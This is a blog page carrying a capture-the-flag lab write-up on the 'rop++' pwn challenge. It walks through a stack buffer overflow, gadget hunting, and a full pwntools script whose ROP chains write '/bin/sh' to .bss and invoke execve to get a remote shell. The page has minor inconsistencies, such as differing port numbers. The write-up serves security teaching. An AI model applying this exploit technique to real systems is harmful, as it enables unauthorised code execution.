<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Simple PWN - 0x12(Lab - rop++)
  #


  tags: CTF PWN eductf
  #

challenge: nc edu-ctf.zoolab.org 10004

  Original Code
  #

#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main()
{
    char buf[0x10];
    const char *msg = &#34;show me rop\n> &#34;;

    write(1, msg, strlen(msg));
    read(0, buf, 0x200);

    return 0;
}
gcc -fno-stack-protector -static -o chal rop++.c

  Analyze
  #



Obviously buffer overflow!!!


Check protector
$ checksec chal
[*] '/home/sbk6401/NTUCS/PWN/Lab/rop++/share/chal'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)


Preliminary idea is using ROP chain and get shell, but the problem is where can I write /bin/sh\x00? We can use vmmap to observe where section is writable and readable → 0x4c5000~0x4c800
"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN - 0x12(Lab - `rop++`)"><meta property="og:description" content="Simple PWN - 0x12(Lab - rop++) # tags: CTF PWN eductf # challenge: nc edu-ctf.zoolab.org 10004
Original Code # #include <stdio.h> #include <unistd.h> #include <string.h> int main() { char buf[0x10]; const char *msg = &#34;show me rop\n> &#34;; write(1, msg, strlen(msg)); read(0, buf, 0x200); return 0; } gcc -fno-stack-protector -static -o chal rop++.c Analyze # Obviously buffer overflow!!!
Check protector
$ checksec chal [*] '/home/sbk6401/NTUCS/PWN/Lab/rop++/share/chal' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Preliminary idea is using ROP chain and get shell, but the problem is where can I write /bin/sh\x00? We can use vmmap to observe where section is writable and readable → 0x4c5000~0x4c800"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><meta property="article:tag" content="Eductf"><title>Simple PWN - 0x12(Lab - `rop++`) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN - 0x12(Lab - `rop++`)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#original-code>Original Code</a></li><li><a href=#analyze>Analyze</a></li><li><a href=#exploit---rop>Exploit - <code>ROP</code></a></li><li><a href=#appendix>Appendix</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn---0x12lab---rop>Simple PWN - 0x12(Lab - <code>rop++</code>)
<a class=anchor href=#simple-pwn---0x12lab---rop>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><p>challenge: <code>nc edu-ctf.zoolab.org 10004</code></p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class="language-cpp!=" data-lang="cpp!=">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

int main()
{
    char buf[0x10];
    const char *msg = &#34;show me rop\n&gt; &#34;;

    write(1, msg, strlen(msg));
    read(0, buf, 0x200);

    return 0;
}
</code></pre><pre tabindex=0><code class=language-makefile! data-lang=makefile!>gcc -fno-stack-protector -static -o chal rop++.c
</code></pre><h2 id=analyze>Analyze
<a class=anchor href=#analyze>#</a></h2><ul><li><p>Obviously buffer overflow!!!</p></li><li><p>Check protector</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ checksec chal
[*] &#39;/home/sbk6401/NTUCS/PWN/Lab/rop++/share/chal&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre></li><li><p>Preliminary idea is using <code>ROP</code> chain and get shell, but the problem is where can I write <code>/bin/sh\x00</code>? We can use <code>vmmap</code> to observe where section is writable and readable → <code>0x4c5000~0x4c800</code>
<img src=https://imgur.com/018Nk8F.png alt></p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ readelf -S chal
...
[25] .bss              NOBITS           00000000004c72a0  000c6290
       0000000000005980  0000000000000000  WA       0     0     32
...
</code></pre><p>We can use <font color=FF0000><code>.bss</code> section(<code>0x4c72a0</code>)</font> to write parameter <code>/bin/sh\x00</code></p><ul><li><font color=FF0000>Note that</font>, because <code>ASLR</code> is enabled, so we cannot write <code>/bin/sh\x00</code> to stack, in addition, <code>PIE</code> is unable, so that we can write and read data from <code>.bss</code> section with fixed address</li></ul></li></ul><h2 id=exploit---rop>Exploit - <code>ROP</code>
<a class=anchor href=#exploit---rop>#</a></h2><ol><li>Write <code>ROP</code> chain in <code>buf</code> parameter<pre tabindex=0><code class=language-bash! data-lang=bash!>$ ROPgadget --binary chal --only &#34;pop|leave|ret|syscall&#34; --multibr &gt; rop_gadget
$ vim rop_gadget
</code></pre><pre tabindex=0><code class=language-python! data-lang=python!>pop_rax_ret = 0x447b27
pop_rdi_ret = 0x401e3f
pop_rsi_ret = 0x409e6e
pop_rdx_rbx_ret = 0x47ed0b
syscall_ret = 0x414506
leave_ret = 0x401797
</code></pre></li><li>Construct <code>ROP</code> chain
In order to achieve our idea, we need another read to write <code>/bin/sh\x00</code> to <code>.bss</code> section<pre tabindex=0><code class=language-python! data-lang=python!>ROP_read = flat(
    # call read function
    pop_rax_ret, 0,
    pop_rdi_ret, 0,
    pop_rsi_ret, 0x4c72a0,
    pop_rdx_rbx_ret, 0x100, 0,
    syscall_ret,    
)
</code></pre>Then we need another <code>ROP</code> chain to call <code>shell</code><pre tabindex=0><code class=language-python! data-lang=python!>ROP_shell = flat(
    # Get shell
    pop_rax_ret, 0x3b,
    pop_rdi_ret, 0x4c72a0,
    pop_rsi_ret, 0,
    pop_rdx_rbx_ret, 0, 0,
    syscall_ret,

)
</code></pre><ul><li>Note that <code>0x4c72a0</code> is the beginning of <code>.bss</code> section</li></ul></li><li>Send payload<pre tabindex=0><code class=language-python! data-lang=python!>binsh = 0x68732f6e69622f #&#39;/bin/sh\x00&#39;
r.sendafter(&#34;show me rop\n&gt;&#34;, b&#39;a&#39;*0x28 + ROP_read + ROP_shell)
r.send(flat(binsh))
</code></pre></li><li>Then we get shell and read flag
<img src=https://imgur.com/mLAdXz1.png alt></li></ol><ul><li>Whole exploit
:::spoiler code<pre tabindex=0><code class=language-python! data-lang=python!>from pwn import *

#r = process(&#39;./chal&#39;)
r = remote(&#39;edu-ctf.zoolab.org&#39;, 10003)
raw_input()
context.arch = &#39;amd64&#39;

pop_rax_ret = 0x447b27
pop_rdi_ret = 0x401e3f
pop_rsi_ret = 0x409e6e
pop_rdx_rbx_ret = 0x47ed0b
syscall_ret = 0x414506
leave_ret = 0x401797

binsh = 0x68732f6e69622f #&#39;/bin/sh\x00&#39;

ROP_read = flat(
    # call read function
    pop_rax_ret, 0,
    pop_rdi_ret, 0,
    pop_rsi_ret, 0x4c72a0,
    pop_rdx_rbx_ret, 0x100, 0,
    syscall_ret,    
)

ROP_shell = flat(
    # Get shell
    pop_rax_ret, 0x3b,
    pop_rdi_ret, 0x4c72a0,
    pop_rsi_ret, 0,
    pop_rdx_rbx_ret, 0, 0,
    syscall_ret,

)

r.sendafter(&#34;show me rop\n&gt;&#34;, b&#39;a&#39;*0x28 + ROP_read + ROP_shell)
r.send(flat(binsh))

r.interactive()
</code></pre>:::</li></ul><h2 id=appendix>Appendix
<a class=anchor href=#appendix>#</a></h2><p>This payload will call <code>sys_read</code> and read something that we send, that is <code>0x68732f6e69622f</code>(<code>/bin/sh\x00</code>), and then it&rsquo;ll call <code>sys_execve</code>.</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#original-code>Original Code</a></li><li><a href=#analyze>Analyze</a></li><li><a href=#exploit---rop>Exploit - <code>ROP</code></a></li><li><a href=#appendix>Appendix</a></li></ul></nav></div></aside></main></body></html>